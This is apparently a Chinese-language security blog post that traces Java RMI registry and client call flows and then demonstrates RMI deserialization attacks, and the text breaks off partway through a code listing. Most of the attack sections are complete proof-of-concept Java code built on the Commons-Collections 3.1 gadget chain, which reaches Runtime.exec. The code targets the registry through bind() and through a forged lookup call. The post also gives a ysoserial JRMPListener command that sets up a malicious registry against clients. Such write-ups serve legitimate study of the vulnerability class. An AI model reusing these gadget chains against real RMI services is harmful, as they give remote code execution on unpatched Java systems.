    public class UserServerTest {
        public static void main(String[] args) throws Exception {
            Registry registry = LocateRegistry.createRegistry(3333);
            User user = new UserImpl();
            registry.bind("HelloRegistry", user);
            System.out.println("rmi start at 3333");
        }
    }
根据createRegistry源码的调用流程，流程图及调用栈如下，其中各种参数的传递这里就不分析了。
  * 创建RemoteStub时的调用栈
  * 创建Skeleton的调用栈
  * 创建Socket服务开启监听调用栈
  * 接收与处理请求的调用栈
处理请求：
需要特别注意的就是这里真正处理请求的部分，以`bind`操作为例，这里对`var3`这个变量进行了判断，并根据不同的数字进行不同的处理，最终调用`var6.bind`进行绑定，最终把服务绑定在`this.bingdings`上。其中`var3`对应关系如下：
  * 0->bind
  * 1->list
  * 2->lookup
  * 3->rebind
  * 4->unbind
从上图过程中也可以看出来，这里对传入的对象进行了一个反序列化的处理。那如果传入的内容是一个恶意对象的话，就可能造成反序列化漏洞。
这里再看一下如果是使用`LocateRegistry.createRegistry`本地获取了注册中心之后，直接绑定服务是什么流程。跟一下就可以看到过程比较简单，经过了一个checkAccess的检测之后就把服务加入了`this.bindings`里了。(上面对请求处理也会调用到这个方法）
这里的checkAccess就是为了检查绑定时是否是在同一个服务器上。
>
> 在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功。
#### LocateRegistry.getRegistry
在`LocateRegistry.createRegistry`的流程图中可以看到，注册中心对端口进行了监听并接受与处理请求。接着再来看通过`LocateRegistry.getRegistry`来远程获取注册中心与请求数据的流程是怎么样的。
首先通过`LocateRegistry.getRegistry`获取到的是`RegistryImpl_Stub`对象：
跟入bind方法：
把传入的服务名称和对象都进行反序列化传递给类型为`ObjectOutput`的`var4`变量。并通过invoke方法传递到Server的`Registry`那边进行处理。来看一下`newCall`方法：
这里传递进来的`var3`为`0`，继续传入到了`new StreamRemoteCall`里：
最后将这个var3发送到服务端那边进行处理。
以这个bind为例，所以远程绑定的流程就是：
  1. 先告诉Server端我们要进行什么样的操作，比如`bind`就传递一个`0`...
  2. 再把服务名和对象都进行反序列化发给Server端
  3. Server端获取到了服务名和对象名之后，反序列化调用`var6.bind()`最终绑定到`this.bindings`上
同样画出流程图如下：  
在这个过程中，存在一个序列化和反序列化的过程，所以存在反序列化漏洞的风险。
### Client端调用方法
测试代码：
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class UserClient {
        public static void main(String[] args) throws Exception{
            Registry registry = LocateRegistry.getRegistry(3333); // 获取注册表
            User userClient = (User) registry.lookup("HelloRegistry"); // 获取命名为HelloRegistr的远程对象的stub
            System.out.println(userClient.name("test"));
            userClient.say("world");
        }
    }
通过lookup获取到的是一个Proxy代理对象：
跟入调用`name`的过程，到了`invoke`方法处，会调用`invokeRemoteMethod`方法：
这里传入了所调用的代理、方法名、参数和`method`的`hash`值到`this.ref.invoke`方法中。`this.ref`中包含了远程服务对象的各类信息，如地址与端口、ObjID等。
invoke函数里就是对这些数据进行处理(参数会序列化)发送到Server端那边。具体这里就不再跟入了。
再来看看Server那边是怎么处理传过来的数据的，Server端处理Client端传递过来的数据在 调用栈如下：
sun/rmi/server/UnicastServerRef.class#dispatch
这里会对传递过来的参数进行反序列化，再使用反射调用方法。我们来看下`unmarshalValue`方法：
在Client端有一个对应的`marshalValue`，是为了序列化参数。
总结一下调用过程：Client端通过Stub代理将参数都序列化传递到Server端，Server端反序列化参数通过反射调用方法获取结果返回。当然如果返回的内容是一个对象的话，返回后同样会进行反序列化过程。
接着来看不同的场景下的反序列化利用：
## RMI 反序列化攻击
根据不同场景下的攻击画出的流程图如下：
四种攻击的方式的利用过程如下：
### 一、服务端与客户端攻击注册中心
服务端和客户端攻击注册中心的方式是相同的，都是远程获取注册中心后传递一个恶意对象进行利用。
#### bind() & rebind()
根据之前我们的分析，远程调用`bind()`绑定服务时，注册中心会对接收到的序列化的对象进行反序列化。所以，我们只需要传入一个恶意的对象即可。这里用的是Common-Collection3.1的poc作为例子：
    package SimpleRMI_2;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.HashMap;
    import java.util.Map;
    public class UserServerEval {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[] {String.class, Class[].class},
                            new Object[] {"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke",
                            new Class[] {Object.class, Object[].class},
                            new Object[] {null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] {String.class},
                            new Object[] {"open -a Calculator"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            innerMap.put("value", "Threezh1");
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
            cons.setAccessible(true);
            InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
            Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject));
            Registry registry = LocateRegistry.createRegistry(3333);
            Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 3333);
            registry_remote.bind("HelloRegistry", proxyEvalObject);
            System.out.println("rmi start at 3333");
        }
    }
这里有一个需要注意的点就是调用`bind()`的时候无法传入`AnnotationInvocationHandler`类的对象，必须要转为Remote类才行。这里使用了下面的方式进行转换：
    InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap); // 将
    Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject));
`AnnotationInvocationHandler`本身实现了`InvocationHandler`接口，再通过代理类封装可以用`class.cast`进行类型转换。又因为反序列化存在传递性，当`proxyEvalObject`被反序列化时，`evalObject`也会被反序列化，自然也会执行poc链。（存在疑问：为什么要用代理类封装才行？）
Remote.class.cast可以参考：[关于JAVA中的Class.cast方法](https://blog.csdn.net/axzsd/article/details/79206172)
这个方法的作用就是强制转换类型。  
反序列化过程参考：[序列化和反序列化](https://zhuanlan.zhihu.com/p/183763564)
除了`bind()`操作之外，`rebind()`也可以这样利用。但是`lookup`和`unbind`只有一个`String`类型的参数，不能直接传递一个对象反序列化。得寻找其他的方式。
#### unbind & lookup
`unbind`的利用方式跟`lookup`是一样的。这里以`lookup`为例。
注册中心在处理请求时，是直接进行反序列化再进行类型转换，转换流程如图所示：
如果我们要控制传递过去的序列化值的话，不能直接传递给`lookup`这个方法，因为它的参数是一个`String`类型。但是它发送请求的流程是可以直接复制的，只需要模仿`lookup`中发送请求的流程，就能够控制发送过去的值为一个对象。
构造出来的POC如下：
    package SimpleRMI_2;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import sun.rmi.server.UnicastRef;
    import java.io.ObjectOutput;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.rmi.server.Operation;
    import java.rmi.server.RemoteCall;
    import java.rmi.server.RemoteObject;
    import java.util.HashMap;
    import java.util.Map;
    public class UserServerEval2 {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[] {String.class, Class[].class},
                            new Object[] {"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke",
                            new Class[] {Object.class, Object[].class},
                            new Object[] {null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] {String.class},
                            new Object[] {"open -a Calculator"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            innerMap.put("value", "Threezh1");
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
            cons.setAccessible(true);
            InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
            Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject));
            Registry registry = LocateRegistry.createRegistry(3333);
            Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 3333);
            // 获取super.ref
            Field[] fields_0 = registry_remote.getClass().getSuperclass().getSuperclass().getDeclaredFields();
            fields_0[0].setAccessible(true);
            UnicastRef ref = (UnicastRef) fields_0[0].get(registry_remote);
            // 获取operations
            Field[] fields_1 = registry_remote.getClass().getDeclaredFields();
            fields_1[0].setAccessible(true);
            Operation[] operations = (Operation[]) fields_1[0].get(registry_remote);
            // 跟lookup方法一样的传值过程
            RemoteCall var2 = ref.newCall((RemoteObject) registry_remote, operations, 2, 4905912898345647071L);
            ObjectOutput var3 = var2.getOutputStream();
            var3.writeObject(proxyEvalObject);
            ref.invoke(var2);
            registry_remote.lookup("HelloRegistry");
            System.out.println("rmi start at 3333");
        }
    }
可以看到，即使报了字符转换的`error`，还是利用成功了。
除了这种伪造请求，还可以`rasp hook请求代码，修改发送数据`进行利用，现在还没接触过rasp，就先不复现了。
### 二、注册中心攻击客户端与服务端
从上面的代码中也可以看出来，客户端和服务端与注册中心的参数交互都是把数据序列化和反序列化来进行的，那这个过程中肯定也是存在一个对注册中心返回的数据的反序列化的处理，这个地方也存在反序列化漏洞风险。(详细分析可以看Bypass
JEP290部分)
可以用ysoserial生成一个恶意的注册中心，当调用注册中心的方法时，就可以进行恶意利用。
    java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections1 'open /System/Applications/Calculator.app'
开启注册中心：
客户端测试代码：
    package SimpleRMI_2;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class UserClientEval {
        public static void main(String[] args) throws Exception {
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",12345);
            registry.list();
        }
    }
执行了之后就可以看到命令执行成功了。
除了`list()`之外，其余的操作都可以进行利用：
    list()
    bind()
    rebind()
    unbind()
    lookup()
例如`bind()`：
### 三、客户端攻击服务端
如果注册服务的对象接收一个参数为对象，那么可以传递一个恶意对象进行利用。比如这里可以传递一个Common-collection3.1反序列化漏洞poc构造出的一个恶意对象作为参数利用：
POC：
    package eval_rmi;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.rmi.Naming;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.HashMap;
    import java.util.Map;
    public class UserClient {
        public static void main(String[] args) throws Exception{
            String url = "rmi://127.0.0.1:3333/User";
            User userClient = (User)Naming.lookup(url);
            System.out.println(userClient.name("test"));
            userClient.say("world");// 这里会在server端输出
            userClient.dowork(getpayload());
        }
        public static Object getpayload() throws Exception {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),